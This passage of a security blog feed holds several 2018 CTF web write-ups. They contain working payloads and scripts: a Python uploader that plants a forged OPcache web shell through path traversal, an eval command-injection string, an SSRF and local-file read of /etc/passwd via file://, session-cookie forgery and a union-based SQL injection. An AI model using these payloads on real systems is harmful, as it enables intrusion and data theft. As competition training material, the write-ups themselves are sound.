+<p>and then, <code class="language-plaintext highlighter-rouge">php -S 127.0.0.1:8080</code> and a simple <code class="language-plaintext highlighter-rouge">wget 127.0.0.1:8080</code> generated the <code class="language-plaintext highlighter-rouge">phpbin</code> file.</p>
+
+<p>Also for this, the <code class="language-plaintext highlighter-rouge">php.ini</code> files has to be updated in the following way:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>opcache.enable=1
+opcache.validate_timestamps=1
+opcache.file_cache= "/var/www/html/cache"
+opcache.file_cache_only=1
+</code></pre></div></div>
+
+<p>Now to calculate the <code class="language-plaintext highlighter-rouge">system_id</code>, we have got a tool over <a href="https://github.com/GoSecure/php7-opcache-override">here</a> and with that, we can identify what we want to calculate.</p>
+
+<p>To calculate the above, the parameters were <code class="language-plaintext highlighter-rouge">php_version = 7.0.28</code> , <code class="language-plaintext highlighter-rouge">zend_extension_id: API320151012,NTS</code> and <code class="language-plaintext highlighter-rouge">zend_bin_id: BIN_SIZEOF_CHAR48888</code>.</p>
+
+<p>Calculation of <code class="language-plaintext highlighter-rouge">system_id</code> : <code class="language-plaintext highlighter-rouge">digest = hashlib.md5(php_version + zend_extension_id + zend_bin_id).hexdigest()</code></p>
+
+<p>Now about solving the challenge, firstly, to control the cache file, we mainly need to get hold of two parameters, <code class="language-plaintext highlighter-rouge">timestamp</code> and <code class="language-plaintext highlighter-rouge">opchache_ID</code>.</p>
+
+<p>After generating the system ID, grab the <code class="language-plaintext highlighter-rouge">timestamp</code>. Set this to the OPcached web-shell (index.php.bin) to bypass opchache.validation_timestamp and upload it.</p>
+
+<p>The final script was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct
+import requests
+
+URL = "http://202.120.7.217:9527/"
+sid = "7badddeddbd076fe8352e80d8ddf3e73"
+UID = "c607e0c365ae4a0ea516aadaad3db7adfe45df9c" #constant
+SID = "7badddeddbd076fe8352e80d8ddf3e73" #SystemID calculated
+
+requests.get(URL+"?action=reset")
+print "Reset done"
+
+
+timestamp = int(requests.get(URL+"?action=time").text)
+print "Time stamp: " + str(ts)
+
+
+f = open("index.php.bin").read()
+
+path = f[:8]+sid+f[40:64]+struct.pack("I", timestamp)+f[68:] #this is done to replace the SystemID and timestamp with a custom one in an already existing one
+
+requests.post(
+    URL+"?action=upload&amp;name=../../../../../tmp/cache/"+SID+"/var/www/html/sandbox/"+UID+"/index.php.bin"
+    , files=dict(file=path)
+    )
+</code></pre></div></div>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33/status/991205002562519041">Twitter</a> for more queries.</p>]]></content><author><name></name></author><category term="Web Security, 0CTF 2018, PHP OPcache" /><summary type="html"><![CDATA[Challenge name: EZdoor]]></summary></entry><entry><title type="html">SunshineCTF 2018</title><link href="https://g0kkk.github.io/blog/2018/SunshineCTF-2018-Evaluation/" rel="alternate" type="text/html" title="SunshineCTF 2018" /><published>2018-04-09T00:06:31+00:00</published><updated>2018-04-09T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/SunshineCTF%202018%20Evaluation</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/SunshineCTF-2018-Evaluation/"><![CDATA[<p>For this CTF, there were four web challenges which were fairly easy and the overall CTF was fun.</p>
+
+<h1 id="challenge-1---web-50-evaluation">Challenge 1 - Web 50 Evaluation</h1>
+
+<p>Link: <code class="language-plaintext highlighter-rouge">http://evaluation.web1.sunshinectf.org</code></p>
+
+<p>Description: <code class="language-plaintext highlighter-rouge">Evaluate your life. How are you doing, and are you doing the best you can possibly do? Look deeper within yourself, beyond the obvious. Look at the source of it all.</code></p>
+
+<p>This challenge took us to a page revealing following source code:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php">```
+<span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'hello'</span><span class="p">];</span>
+<span class="k">eval</span><span class="p">(</span><span class="s2">"var_dump(</span><span class="nv">$a</span><span class="s2">);"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+```</code></pre></figure>
+
+<p>Pretty much evident that we need to pass a <code class="language-plaintext highlighter-rouge">GET</code> parameter which was <code class="language-plaintext highlighter-rouge">hello</code>. Since whatever input we are giving is going to get evaluated and we know that the flag is inside <code class="language-plaintext highlighter-rouge">flag.php</code>,</p>
+
+<p><b>hello=<code class="language-plaintext highlighter-rouge">cat flag.php | grep sun -ni</code><b></b></b></p>
+
+<p>gave the flag.</p>
+
+<p>Final payload: <b>http://evaluation.web1.sunshinectf.org/?hello=<code class="language-plaintext highlighter-rouge">cat%20flag.php%20|%20grep%20sun%20-ni</code><b></b></b></p>
+
+<h1 id="challenge-2---web-100-marceau">Challenge 2 - Web 100 Marceau</h1>
+
+<p>Link: <code class="language-plaintext highlighter-rouge">http://marceau.web1.sunshinectf.org</code></p>
+
+<p>Description: <code class="language-plaintext highlighter-rouge">Hey my friend tells me that the flag is in this site's source code. Idk how to read that though, lol (ðŸ…±ï¸retty lame tbh ðŸ˜‚)</code></p>
+
+<p>We were greeted with the following text in the challenge page which was in between <code class="language-plaintext highlighter-rouge">marquee</code> tags:</p>
+
+<p><code class="language-plaintext highlighter-rouge">You specifically want my PHP source. Why did you accept anything else?</code></p>
+
+<p>Apart from this, by the time I started playing the CTF, there was a hint already provided which made it pretty easy where the hint was:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Hint 2018-04-06 00:20 UTC: There are many different types of MIMEs, but only a handful were truly legendary...</code></p>
+
+<p>Intercepting with burp and modifying <code class="language-plaintext highlighter-rouge">Accept:</code> to <code class="language-plaintext highlighter-rouge">text/php</code> reveals the flag. For this, a quick googling of <code class="language-plaintext highlighter-rouge">PHP MIME types</code> gave the further insight.</p>
+
+<h1 id="challenge-3---web-150-home-sweet-home">Challenge 3 - Web 150 Home Sweet Home</h1>
+
+<p>Link: <code class="language-plaintext highlighter-rouge">http://web1.sunshinectf.org:50005</code></p>
+
+<p>Description: <code class="language-plaintext highlighter-rouge">Looks like this site is doing some IP filtering. That's very FORWARD thinking of them.</code></p>
+
+<p>Well, description itself says that we need to use <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> and that was it for the challenge.</p>
+
+<p>The challenge page is greeted with <code class="language-plaintext highlighter-rouge">14.212.11.223 This IP address is not authorized</code>.</p>
+
+<p>Intercepting the request and adding <code class="language-plaintext highlighter-rouge">X-Forwarded-For:127.0.0.1</code> gives us the flag.</p>
+
+<h1 id="challenge-4---web-250-searchbar">Challenge 4 - Web 250 SearchBar</h1>
+
+<p>Link: <code class="language-plaintext highlighter-rouge">http://search-box.web1.sunshinectf.org</code></p>
+
+<p>Description: <code class="language-plaintext highlighter-rouge">This search engine doesn't look very secure.
+Or well coded.
+Or competent in any way shape or form.
+This should be easy.
+Note: flag is in /etc/flag.txt
+</code></p>
+
+<p>We were greeted with a page wherein <code class="language-plaintext highlighter-rouge">https://www.google.com</code> was filled and also a submit button. Clicking on the submit button takes a to a page where it is shown as fetching the source code. Okay, now since our aim was to read the <code class="language-plaintext highlighter-rouge">flag</code> from the location we know, I tried fuzzing through the search bar and found that <code class="language-plaintext highlighter-rouge">www.google.com</code> was necessary and also they were using <code class="language-plaintext highlighter-rouge">parse_url</code>. I had recently read a <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">blog</a> regarding the same.</p>
+
+<p>I then used another scheme which was <code class="language-plaintext highlighter-rouge">file://</code> but then using <code class="language-plaintext highlighter-rouge">/</code> soon after being used for scheme was also blocked. And hence, a simple payload <code class="language-plaintext highlighter-rouge">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file://www.google.com/etc/flag.txt#</code> gave the flag.</p>]]></content><author><name></name></author><category term="Web Security, CTF, command injection, SSRF, X-Forwarding-For" /><summary type="html"><![CDATA[For this CTF, there were four web challenges which were fairly easy and the overall CTF was fun.]]></summary></entry><entry><title type="html">NuitDuHack 2018 CoinGame</title><link href="https://g0kkk.github.io/blog/2018/NuitDuHack-2018-Coingame/" rel="alternate" type="text/html" title="NuitDuHack 2018 CoinGame" /><published>2018-04-02T00:06:31+00:00</published><updated>2018-04-02T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/%20NuitDuHack%202018%20Coingame</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/NuitDuHack-2018-Coingame/"><![CDATA[<p>I did not get much time to play this CTF but within the time frame, CoinGame was one of the challenges which I was able to solve. This challenge had comparatively lesser solves than other web challenges but was easy.</p>
+
+<p>Challenge link : <code class="language-plaintext highlighter-rouge">http://coingame.challs.malice.fr/</code></p>
+
+<p>Points: <code class="language-plaintext highlighter-rouge">200</code></p>
+
+<p>So about this challenge, we get a welcome page wherein it is written <code class="language-plaintext highlighter-rouge">CURL service</code></p>
+<figure class="foto-legenda">
+	<img src="../assets/nuitduhack/HomeScreen.png" alt="" />
+</figure>
+
+<p>and a textbox wherein we can give url’s (hopefully).</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/nuitduhack/cURL_request.png" alt="" />
+</figure>
+
+<p>The source code revealed nothing. But after giving <code class="language-plaintext highlighter-rouge">google.com</code> in the textbox, we were able to notice a particular request being set and showing us a page with response status <code class="language-plaintext highlighter-rouge">302</code>. The URL was perfect enough to understand what it was, LFI.</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/nuitduhack/url.png" alt="" />
+</figure>
+
+<p>The very next step was to see what is inside <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. <code class="language-plaintext highlighter-rouge">http://coingame.challs.malice.fr/curl.php?way=../../../etc/passwd</code> reveals nothing but, <code class="language-plaintext highlighter-rouge">http://coingame.challs.malice.fr/curl.php?way=file:///etc/passwd</code> gave us the list of every registered user that has access to that system.</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/nuitduhack/etc.png" alt="" />
+</figure>
+
+<p>One particular thing that caught in my mind was <a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol">tftp</a>. Since the challenge description had mentioned a game, I quickly googled and got the link to the same <a href="https://github.com/totheyellowmoon/CoinGame/">repo</a>.</p>
+
+<p>Since the file names were there, I quickly tried to see if the files that exist in the challenge server are the same. I then gave in <code class="language-plaintext highlighter-rouge">http://coingame.challs.malice.fr/curl.php?way=file:///home/CoinGame/Bonus.py</code> which gave me the <code class="language-plaintext highlighter-rouge">Bonus.py</code> file.</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/nuitduhack/coingamedir.png" alt="" />
+</figure>
+
+<p>I assumed that all the other challenge file names would be the same and we have to only find the files which are altered by the admin of the challenge. I was quickly going through the files in the github repo and found that there were a lot of files and manually fetching would be cumbersome.</p>
+
+<p>So with the help of my team mate, <code class="language-plaintext highlighter-rouge">dnvira</code>, we got a <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/tree/master/scripts/NuitDu">script</a> which would actually wget the entire files and subdirectories.</p>
+
+<p>Comparing the hashes of the cloned repo and the one we got from the challenge server gave us a few files being differentiate from others. I was going through a few of them and apparently a few images in <code class="language-plaintext highlighter-rouge">gameAnimationImages</code> had flag written at the bottom end.</p>
+
+<p><code class="language-plaintext highlighter-rouge">flag{_Rends_l'_......</code></p>
+
+<p>There were two places wherein I was stuck. One was using <code class="language-plaintext highlighter-rouge">tftp</code> which would have been a way to proceed further and the next one, fetching all the files. Apparently the former one was where I was stuck for long time.</p>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33">Twitter.</a></p>]]></content><author><name></name></author><category term="Web, CTF, LFI, Web Security" /><summary type="html"><![CDATA[I did not get much time to play this CTF but within the time frame, CoinGame was one of the challenges which I was able to solve. This challenge had comparatively lesser solves than other web challenges but was easy.]]></summary></entry><entry><title type="html">Session_id manipulation - SharifCTF 2018</title><link href="https://g0kkk.github.io/blog/2018/SharifCTF-2018-Web-Photoshare/" rel="alternate" type="text/html" title="Session_id manipulation - SharifCTF 2018" /><published>2018-02-04T00:06:31+00:00</published><updated>2018-02-04T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/SharifCTF%202018%20Web%20Photoshare</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/SharifCTF-2018-Web-Photoshare/"><![CDATA[<p>So this was my very next CTF after Acebear which was a Fun CTF. Talking about this challenge, the only reason why I’m writing a write up
+is that this challenge had comparatively very less solves.</p>
+
+<p>The description talks about the username which is <code class="language-plaintext highlighter-rouge">jack</code> and states that <code class="language-plaintext highlighter-rouge">password: Year and month of Jack's birthday.</code>. So the first step
+that came into my mind was bruteforcing the hell out of there( <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/blob/master/exploit.py">Exploit</a> ) and had a very hard time in finding them
+as the DOB was kinda screwed up. Finally after around one hour, managed to get the DOB, <code class="language-plaintext highlighter-rouge">195408</code> which was the password and took us to the
+next page, <code class="language-plaintext highlighter-rouge">GetImages</code> wherein there were a lot of images being showed up and also, a functionality to upload the image.</p>
+
+<p>The very next thing that had came into my mind was <code class="language-plaintext highlighter-rouge">Image upload vulnerability</code> and tried to play it with a lot. Since they were only accepting
+images, I tried to append php code towards the end of an image and upload. I tried downloading the image that was uploaded but only to see that
+the php code was stripped off. I tried to play it with so long but nothing came out of the way.</p>
+
+<p>Then after sometime, I noticed something in the description which was, ` Login to this website as admin.<code class="language-plaintext highlighter-rouge"> which I did not care much in the
+beginning. So the next thing what had come into my mind was, XSS. Ah damn, well, I was looking for all the other places where I could trigger
+XSS payload but hardluck, nothing worked. As I was running out of ideas, one of my team mate said they have given a hint and that was
+</code>No need for XSS or bypassing the uploader<code class="language-plaintext highlighter-rouge">. Well, now I was stuck and thinking of all the other possibilities and checked out the cookies
+randomly only to see that </code>Session_id<code class="language-plaintext highlighter-rouge"> was an md5 encrypted one which when decrypted gave </code>jackxx<code class="language-plaintext highlighter-rouge"> where </code>xx` represents the number possibly
+depecting the number of logins attempted with that user in a time frame.</p>
+
+<p>So I modified the <code class="language-plaintext highlighter-rouge">session_id</code> cookie to <code class="language-plaintext highlighter-rouge">md5(admin1)</code> where <code class="language-plaintext highlighter-rouge">1</code> was just a random number and then after refresh, I was taken to another page
+which was to answer a secret question. Well, tried every shit over there only to see that it was nothing but again guessing with some damn thing.
+Later, the admin said that the answer to that question is on the server and tried every single word over there only to see that the answer was
+from an image which was <code class="language-plaintext highlighter-rouge">Mr. Tashakkor</code> wherein it was refered to as the <code class="language-plaintext highlighter-rouge">name of the first teacher</code>.</p>
+
+<p>That was it with a pretty badly designed challenge and a lot of guessing. Well, I appreciate the effort for hosting these challenges but I
+personally don’t find fun in playing these kind of challenges.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">SharifCTF{kmvfwmj6sea7get9wggu249ehjc8hmdd}</code></p>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33">Twitter</a>.</p>]]></content><author><name></name></author><category term="Web, CTF, Bruteforce, Session_id manipulation" /><summary type="html"><![CDATA[So this was my very next CTF after Acebear which was a Fun CTF. Talking about this challenge, the only reason why I’m writing a write up is that this challenge had comparatively very less solves.]]></summary></entry><entry><title type="html">CodeGatePreQuals 2018</title><link href="https://g0kkk.github.io/blog/2018/CodeGate-Quals-2018-Web-SimpleCMS/" rel="alternate" type="text/html" title="CodeGatePreQuals 2018" /><published>2018-02-04T00:06:31+00:00</published><updated>2018-02-04T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/CodeGate%20Quals%202018%20Web%20SimpleCMS</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/CodeGate-Quals-2018-Web-SimpleCMS/"><![CDATA[<p>As usual, the CTF contained pretty hard challenges and there were only two web challenges. The challenge name was <code class="language-plaintext highlighter-rouge">SimpleCMS</code> which is basically a Content Management System for which they gave the source code. Woah, neet and clean and yes, setting up a challenge locally is nothing more awesome!</p>
+
+<p>Moving onto the challenge, from the very first view, it seems to be SQLi but I was obvious that there were some filters as I tried to register with a password as <code class="language-plaintext highlighter-rouge">password</code> which was basically denied and that was because <code class="language-plaintext highlighter-rouge">or</code> was filtered by the <code class="language-plaintext highlighter-rouge">waf</code> file.</p>
+
+<p>Since an instance was running locally, I was able to figure out that the <code class="language-plaintext highlighter-rouge">flag</code> was in the third column of the table named <code class="language-plaintext highlighter-rouge">xx_flag</code> where in <code class="language-plaintext highlighter-rouge">xx</code> denoted a random str. Also, there is a column in the table but then even that has a random str appended towards the beginning. So now, I knew that I have to get the table name, column name as well. The next question was, SQLi - how, where?</p>
+
+<p>The next step was finding out where the injection point is and after a fair amount of time, I was able to find that, query is <code class="language-plaintext highlighter-rouge">LOWER({$column[$i]}) like '%{$search}%' {$operator}</code> and yes, possibly injection in <code class="language-plaintext highlighter-rouge">{$search}</code>. Moreover, I did not find <code class="language-plaintext highlighter-rouge">LIKE</code> keyword to be listed in the blacklist.</p>
+
+<p>Taking a look at the <code class="language-plaintext highlighter-rouge">search code</code> in the file <code class="language-plaintext highlighter-rouge">Board.class.php</code> gives us more information about the search function.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+function action_search(){
+			$column = Context::get('col');
+			$search = Context::get('search');
+			$type = strtolower(Context::get('type'));
+			$operator = 'or';
+
+			if($type === '1'){
+				$operator = 'or';
+			}
+			else if($type === '2'){
+				$operator = 'and';
+			}
+			if(preg_match('/[\&lt;\&gt;\'\"\\\'\\\"\%\=\(\)\/\^\*\-`;,.@0-9\s!\?\[\]\+_&amp;$]/is', $column)){
+				$column = 'title';
+			}
+			$query = get_search_query($column, $search, $operator);
+			$result = DB::fetch_multi_row('board', '', '', '0, 10','date desc', $query);
+			include(CMS_SKIN_PATH . 'board.php');
+		}
+		function action_read(){
+			$idx = Context::get('idx');
+			if(!$idx)
+				alert('not found', 'back');
+			$query = array('idx'=&gt;$idx);
+
+			$result = DB::fetch_row('board', $query);
+			include(CMS_SKIN_PATH . 'post.php');
+		}
+	}
+  ?&gt;
+</code></pre></div></div>
+
+<p>In the above code, which is pretty weird, you can see that a newline can cause an error.</p>
+
+<p>So building up the payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://13.125.3.183/index.php?act=board&amp;mid=search&amp;col=title#&amp;type=1&amp;search=test%0a)&lt;0 union select 1,(select table_name from mysql.innodb_table_stats limit 2,1),3,4,5#
+</code></pre></div></div>
+<p>which fetches the <code class="language-plaintext highlighter-rouge">{table_prefix}</code> and also, <code class="language-plaintext highlighter-rouge">information_schema</code> can’t be used and that is also blacklisted and finally building the payload to get the <code class="language-plaintext highlighter-rouge">flag</code> using <code class="language-plaintext highlighter-rouge">join</code> fetches us <code class="language-plaintext highlighter-rouge">flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}</code>.</p>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33">Twitter</a>.</p>]]></content><author><name></name></author><category term="Web, CTF, SQLi, Web Security" /><summary type="html"><![CDATA[As usual, the CTF contained pretty hard challenges and there were only two web challenges. The challenge name was SimpleCMS which is basically a Content Management System for which they gave the source code. Woah, neet and clean and yes, setting up a challenge locally is nothing more awesome!]]></summary></entry></feed>
